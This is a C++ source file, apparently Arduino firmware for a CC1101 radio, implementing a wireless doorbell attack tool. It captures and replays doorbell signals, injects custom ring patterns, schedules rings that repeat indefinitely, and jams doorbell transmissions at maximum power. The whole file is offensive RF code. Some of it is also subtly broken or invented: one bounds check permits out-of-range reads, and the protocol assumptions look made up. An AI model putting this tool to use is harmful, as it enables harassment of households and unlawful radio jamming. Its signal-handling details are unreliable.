#include "WirelessDoorbellAttack.h"

WirelessDoorbellAttack::WirelessDoorbellAttack()
{
    signalProcessor = new RFSignalProcessor();
    currentDoorbell = nullptr;
    active = false;
}

WirelessDoorbellAttack::~WirelessDoorbellAttack()
{
    delete signalProcessor;
}

bool WirelessDoorbellAttack::init(const Config &config)
{
    this->config = config;

    // Initialize CC1101 with doorbell specific settings
    ELECHOUSE_CC1101.Init();
    ELECHOUSE_CC1101.setModulation(config.modulation);
    ELECHOUSE_CC1101.setMHZ(config.frequency);
    ELECHOUSE_CC1101.SetRx();

    // Initialize with some common doorbell profiles
    DoorbellProfile basic = {
        "Generic",
        433920000,    // 433.92MHz
        2,            // FSK
        {0xAA, 0x55}, // Common identifier
        {
            {{1000}, {500}, 3, "Standard Chime"},
            {{1000, 1200}, {300, 300}, 2, "Two-Tone Chime"}}};
    addDoorbellProfile(basic);

    return true;
}

bool WirelessDoorbellAttack::startCapture()
{
    if (active)
    {
        return false;
    }

    active = true;
    return signalProcessor->startListening(config.frequency);
}

bool WirelessDoorbellAttack::stopCapture()
{
    if (!active)
    {
        return false;
    }

    active = false;
    signalProcessor->stopListening();
    return true;
}

bool WirelessDoorbellAttack::learnDoorbellPattern()
{
    if (!active)
    {
        return false;
    }

    std::vector<uint8_t> signal;
    if (!signalProcessor->captureSignal(signal))
    {
        return false;
    }

    if (!analyzeTonePattern(signal))
    {
        return false;
    }

    return true;
}

bool WirelessDoorbellAttack::analyzeTonePattern(const std::vector<uint8_t> &signal)
{
    if (signal.empty())
    {
        return false;
    }

    // Extract frequency components
    std::vector<uint16_t> frequencies;
    std::vector<uint16_t> durations;

    size_t i = 0;
    while (i < signal.size())
    {
        // Look for tone markers (typically 0xAA or similar)
        if (signal[i] == 0xAA)
        {
            if (i + 2 < signal.size())
            {
                // Extract frequency and duration
                uint16_t freq = (signal[i + 1] << 8) | signal[i + 2];
                uint16_t dur = (signal[i + 3] << 8) | signal[i + 4];

                if (isValidFrequency(freq))
                {
                    frequencies.push_back(freq);
                    durations.push_back(dur);
                }

                i += 5;
            }
        }
        i++;
    }

    if (!frequencies.empty())
    {
        lastCapturedPattern = createCustomPattern(frequencies, durations);
        return true;
    }

    return false;
}

bool WirelessDoorbellAttack::detectDoorbellModel(const std::vector<uint8_t> &signal)
{
    if (signal.empty())
    {
        return false;
    }

    return matchDoorbellProfile(signal);
}

bool WirelessDoorbellAttack::triggerDoorbell(const TonePattern &pattern)
{
    if (!validateTonePattern(pattern))
    {
        return false;
    }

    optimizeTransmission();
    return transmitTonePattern(pattern);
}

bool WirelessDoorbellAttack::injectCustomTone(
    const std::vector<uint16_t> &frequencies,
    const std::vector<uint16_t> &durations)
{
    if (frequencies.empty() || frequencies.size() != durations.size())
    {
        return false;
    }

    TonePattern custom = createCustomPattern(frequencies, durations);
    return triggerDoorbell(custom);
}

bool WirelessDoorbellAttack::scheduleRing(
    const TonePattern &pattern,
    uint32_t timestamp,
    uint16_t repeatInterval)
{
    if (!validateTonePattern(pattern))
    {
        return false;
    }

    ScheduledRing ring = {
        pattern,
        timestamp,
        repeatInterval,
        repeatInterval > 0 ? 255 : 1 // If interval > 0, repeat indefinitely
    };

    scheduledRings.push(ring);
    return true;
}

bool WirelessDoorbellAttack::jamDoorbellSignal()
{
    if (!active)
    {
        return false;
    }

    // Switch to transmit mode at max power
    ELECHOUSE_CC1101.SetTx();
    ELECHOUSE_CC1101.setPa(12);

    // Send jamming signal
    uint8_t jamSignal[64];
    memset(jamSignal, 0xFF, sizeof(jamSignal));

    bool success = ELECHOUSE_CC1101.SendData(jamSignal, sizeof(jamSignal));

    ELECHOUSE_CC1101.SetRx();
    return success;
}

void WirelessDoorbellAttack::addDoorbellProfile(const DoorbellProfile &profile)
{
    knownDoorbells.push_back(profile);
}

bool WirelessDoorbellAttack::selectDoorbell(const std::string &manufacturer)
{
    for (auto &doorbell : knownDoorbells)
    {
        if (doorbell.manufacturer == manufacturer)
        {
            currentDoorbell = &doorbell;

            // Configure radio for this doorbell
            ELECHOUSE_CC1101.setMHZ(doorbell.frequency / 1000000.0);
            ELECHOUSE_CC1101.setModulation(doorbell.modulation);

            return true;
        }
    }
    return false;
}

TonePattern WirelessDoorbellAttack::createCustomPattern(
    const std::vector<uint16_t> &freqs,
    const std::vector<uint16_t> &durations)
{
    TonePattern pattern;
    pattern.frequencies = freqs;
    pattern.durations = durations;
    pattern.repeatCount = 1;
    pattern.description = "Custom pattern";
    return pattern;
}

bool WirelessDoorbellAttack::isActive() const
{
    return active;
}

void WirelessDoorbellAttack::clearScheduledRings()
{
    while (!scheduledRings.empty())
    {
        scheduledRings.pop();
    }
}

bool WirelessDoorbellAttack::processScheduledRings()
{
    if (scheduledRings.empty())
    {
        return false;
    }

    uint32_t currentTime = millis();
    updateScheduledRings();

    while (!scheduledRings.empty())
    {
        ScheduledRing &ring = scheduledRings.front();

        if (currentTime >= ring.timestamp)
        {
            // Execute the scheduled ring
            if (triggerDoorbell(ring.pattern))
            {
                if (ring.repeatInterval > 0 && ring.remainingRepeats > 0)
                {
                    // Schedule next repeat
                    ring.timestamp += ring.repeatInterval;
                    ring.remainingRepeats--;

                    // Move to back of queue if more repeats pending
                    if (ring.remainingRepeats > 0)
                    {
                        scheduledRings.push(ring);
                    }
                }
            }
            scheduledRings.pop();
        }
        else
        {
            break; // Future rings not ready yet
        }
    }

    return true;
}

size_t WirelessDoorbellAttack::getScheduledRingsCount() const
{
    return scheduledRings.size();
}

bool WirelessDoorbellAttack::validateTonePattern(const TonePattern &pattern)
{
    if (pattern.frequencies.empty() || pattern.frequencies.size() != pattern.durations.size())
    {
        return false;
    }

    for (uint16_t freq : pattern.frequencies)
    {
        if (!isValidFrequency(freq))
        {
            return false;
        }
    }

    return true;
}

bool WirelessDoorbellAttack::transmitTonePattern(const TonePattern &pattern)
{
    std::vector<uint8_t> signal;

    // Construct signal with tone markers
    for (size_t i = 0; i < pattern.frequencies.size(); i++)
    {
        signal.push_back(0xAA); // Tone marker
        signal.push_back((pattern.frequencies[i] >> 8) & 0xFF);
        signal.push_back(pattern.frequencies[i] & 0xFF);
        signal.push_back((pattern.durations[i] >> 8) & 0xFF);
        signal.push_back(pattern.durations[i] & 0xFF);
    }

    // Add checksum
    uint32_t checksum = calculateChecksum(signal);
    signal.push_back((checksum >> 24) & 0xFF);
    signal.push_back((checksum >> 16) & 0xFF);
    signal.push_back((checksum >> 8) & 0xFF);
    signal.push_back(checksum & 0xFF);

    ELECHOUSE_CC1101.SetTx();

    bool success = true;
    for (uint8_t i = 0; i < pattern.repeatCount; i++)
    {
        if (!ELECHOUSE_CC1101.SendData(signal.data(), signal.size()))
        {
            success = false;
            break;
        }
        if (i < pattern.repeatCount - 1)
        {
            delay(100); // Delay between repeats
        }
    }

    ELECHOUSE_CC1101.SetRx();
    return success;
}

void WirelessDoorbellAttack::optimizeTransmission()
{
    // Set medium power level for doorbells
    ELECHOUSE_CC1101.setPa(8);

    // Optimize for typical doorbell frequencies
    if (config.frequency > 300000000)
    {
        ELECHOUSE_CC1101.setMHZ(config.frequency / 1000000.0);
    }
}

bool WirelessDoorbellAttack::isValidFrequency(uint16_t freq)
{
    // Most doorbell chimes use frequencies between 200Hz and 4000Hz
    return freq >= 200 && freq <= 4000;
}

uint32_t WirelessDoorbellAttack::calculateChecksum(const std::vector<uint8_t> &data)
{
    uint32_t crc = 0xFFFFFFFF;

    for (uint8_t byte : data)
    {
        crc ^= byte;
        for (int i = 0; i < 8; i++)
        {
            if (crc & 1)
            {
                crc = (crc >> 1) ^ 0xEDB88320;
            }
            else
            {
                crc >>= 1;
            }
        }
    }

    return ~crc;
}

void WirelessDoorbellAttack::updateScheduledRings()
{
    if (scheduledRings.empty())
    {
        return;
    }

    uint32_t currentTime = millis();
    std::queue<ScheduledRing> validRings;

    while (!scheduledRings.empty())
    {
        ScheduledRing ring = scheduledRings.front();
        scheduledRings.pop();

        // Keep only future rings or those with remaining repeats
        if (currentTime <= ring.timestamp || (ring.repeatInterval > 0 && ring.remainingRepeats > 0))
        {
            validRings.push(ring);
        }
    }

    scheduledRings = validRings;
}

bool WirelessDoorbellAttack::matchDoorbellProfile(const std::vector<uint8_t> &signal)
{
    for (const auto &doorbell : knownDoorbells)
    {
        if (signal.size() >= doorbell.identifierCode.size())
        {
            bool match = true;
            for (size_t i = 0; i < doorbell.identifierCode.size(); i++)
            {
                if (signal[i] != doorbell.identifierCode[i])
                {
                    match = false;
                    break;
                }
            }
            if (match)
            {
                currentDoorbell = const_cast<DoorbellProfile *>(&doorbell);
                return true;
            }
        }
    }
    return false;
}
